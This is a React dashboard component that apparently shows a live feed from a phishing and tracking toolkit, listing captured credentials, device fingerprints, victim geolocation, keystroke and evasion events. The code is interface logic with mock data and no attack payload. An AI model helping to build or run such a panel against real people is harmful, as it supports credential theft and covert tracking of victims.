// components/Dashboard/ActivityFeed.jsx
import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Keyboard, 
  MapPin, 
  Fingerprint, 
  User, 
  Shield, 
  AlertTriangle,
  ChevronRight,
  ExternalLink
} from 'lucide-react';
import { useWebSocket } from '../../hooks/useWebSocket';

const ActivityFeed = () => {
  const [activities, setActivities] = useState([]);
  const { lastMessage, sendMessage } = useWebSocket('ws://localhost:8000/ws/activity/');

  useEffect(() => {
    // Simulate initial data
    const mockData = [
      {
        id: 1,
        type: 'phishing',
        title: 'Credentials Captured',
        description: 'User submitted login credentials',
        ip: '192.168.1.100',
        timestamp: new Date(Date.now() - 300000),
        severity: 'high',
        icon: User
      },
      {
        id: 2,
        type: 'fingerprint',
        title: 'New Device Fingerprint',
        description: 'Chrome 98 on Windows 11',
        ip: '10.0.0.45',
        timestamp: new Date(Date.now() - 600000),
        severity: 'medium',
        icon: Fingerprint
      },
      {
        id: 3,
        type: 'geolocation',
        title: 'Location Data Received',
        description: 'San Francisco, CA',
        ip: '172.16.0.22',
        timestamp: new Date(Date.now() - 900000),
        severity: 'low',
        icon: MapPin
      }
    ];
    setActivities(mockData);
  }, []);

  useEffect(() => {
    if (lastMessage) {
      const data = JSON.parse(lastMessage.data);
      const newActivity = {
        id: Date.now(),
        ...data,
        timestamp: new Date()
      };
      
      setActivities(prev => [newActivity, ...prev.slice(0, 9)]);
      
      // Trigger notification animation
      const audio = new Audio('/sounds/notification.wav');
      audio.volume = 0.3;
      audio.play().catch(() => {});
    }
  }, [lastMessage]);

  const getIcon = (type) => {
    switch(type) {
      case 'phishing': return User;
      case 'fingerprint': return Fingerprint;
      case 'geolocation': return MapPin;
      case 'keystroke': return Keyboard;
      case 'evasion': return Shield;
      default: return AlertTriangle;
    }
  };

  const getSeverityColor = (severity) => {
    switch(severity) {
      case 'high': return 'text-hacker-red';
      case 'medium': return 'text-yellow-500';
      case 'low': return 'text-hacker-green';
      default: return 'text-gray-400';
    }
  };

  const getSeverityBg = (severity) => {
    switch(severity) {
      case 'high': return 'bg-hacker-red/20 border-hacker-red/30';
      case 'medium': return 'bg-yellow-500/20 border-yellow-500/30';
      case 'low': return 'bg-hacker-green/20 border-hacker-green/30';
      default: return 'bg-gray-500/20 border-gray-500/30';
    }
  };

  const formatTime = (date) => {
    const now = new Date();
    const diff = now - date;
    
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    return `${Math.floor(diff / 86400000)}d ago`;
  };

  return (
    <motion.div
      initial={{ opacity: 0, x: -20 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5 }}
      className="terminal-window p-6"
    >
      <div className="flex items-center justify-between mb-6">
        <h3 className="text-lg font-cyber font-bold text-white">
          REAL-TIME ACTIVITY
        </h3>
        <motion.div
          className="flex items-center space-x-2"
          animate={{ opacity: [1, 0.5, 1] }}
          transition={{ duration: 2, repeat: Infinity }}
        >
          <div className="w-2 h-2 rounded-full bg-hacker-green"></div>
          <span className="text-xs font-mono text-hacker-green">LIVE</span>
        </motion.div>
      </div>

      <div className="space-y-4 max-h-[500px] overflow-y-auto terminal-scrollbar">
        <AnimatePresence>
          {activities.map((activity, index) => {
            const Icon = getIcon(activity.type);
            
            return (
              <motion.div
                key={activity.id}
                initial={{ opacity: 0, x: -50 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 50 }}
                transition={{ 
                  duration: 0.3,
                  delay: index * 0.1 
                }}
                whileHover={{ 
                  x: 10,
                  backgroundColor: 'rgba(0, 255, 0, 0.05)'
                }}
                className={`p-4 rounded-lg border ${getSeverityBg(activity.severity)} 
                          cursor-pointer group transition-all duration-300`}
              >
                <div className="flex items-start space-x-4">
                  {/* Icon with animation */}
                  <motion.div
                    className={`p-3 rounded-lg ${getSeverityBg(activity.severity)} 
                              relative overflow-hidden`}
                    whileHover={{ rotate: 360 }}
                    transition={{ duration: 0.5 }}
                  >
                    <Icon className={`w-5 h-5 ${getSeverityColor(activity.severity)}`} />
                    
                    {/* Pulsing ring effect */}
                    <motion.div
                      className="absolute inset-0 rounded-lg border"
                      animate={{
                        borderColor: [
                          'rgba(0, 255, 0, 0)',
                          getSeverityColor(activity.severity).replace('text-', 'rgba(') + ', 0.5)',
                          'rgba(0, 255, 0, 0)'
                        ]
                      }}
                      transition={{ duration: 2, repeat: Infinity }}
                    />
                  </motion.div>

                  {/* Content */}
                  <div className="flex-1">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="font-cyber font-bold text-white">
                        {activity.title}
                      </h4>
                      <span className="text-xs font-mono text-gray-400">
                        {formatTime(activity.timestamp)}
                      </span>
                    </div>
                    
                    <p className="text-sm text-gray-300 mb-3">
                      {activity.description}
                    </p>
                    
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-4">
                        <div className="flex items-center space-x-2">
                          <div className="w-2 h-2 rounded-full bg-hacker-blue"></div>
                          <span className="text-xs font-mono text-gray-400">
                            {activity.ip}
                          </span>
                        </div>
                        
                        <div className={`px-2 py-1 rounded text-xs font-mono ${getSeverityColor(activity.severity)}`}>
                          {activity.severity.toUpperCase()}
                        </div>
                      </div>
                      
                      <motion.div
                        className="opacity-0 group-hover:opacity-100 transition-opacity"
                        whileHover={{ scale: 1.2 }}
                      >
                        <ExternalLink className="w-4 h-4 text-hacker-green" />
                      </motion.div>
                    </div>
                  </div>
                </div>

                {/* Animated progress bar */}
                <motion.div
                  className="h-0.5 bg-gradient-to-r from-transparent via-current to-transparent mt-3"
                  initial={{ width: 0 }}
                  animate={{ width: '100%' }}
                  transition={{ duration: 5, ease: "linear" }}
                  style={{ 
                    background: `linear-gradient(to right, transparent, ${getSeverityColor(activity.severity).replace('text-', '')}, transparent)`
                  }}
                />
              </motion.div>
            );
          })}
        </AnimatePresence>
      </div>

      {/* Live data stream indicator */}
      <div className="mt-6 p-4 rounded-lg bg-cyber-dark border border-terminal-border">
        <div className="flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="relative">
              <div className="w-3 h-3 rounded-full bg-hacker-green"></div>
              <motion.div
                className="absolute inset-0 rounded-full bg-hacker-green"
                animate={{ scale: [1, 2], opacity: [0.5, 0] }}
                transition={{ duration: 1, repeat: Infinity }}
              />
            </div>
            <span className="text-sm font-mono text-white">
              Listening on port 8080
            </span>
          </div>
          
          <div className="flex items-center space-x-2">
            {[1, 2, 3].map((i) => (
              <motion.div
                key={i}
                className="w-1 h-4 bg-hacker-green"
                animate={{ height: ['8px', '16px', '8px'] }}
                transition={{ 
                  repeat: Infinity, 
                  duration: 1,
                  delay: i * 0.2 
                }}
              />
            ))}
          </div>
        </div>
      </div>
    </motion.div>
  );
};

export default ActivityFeed;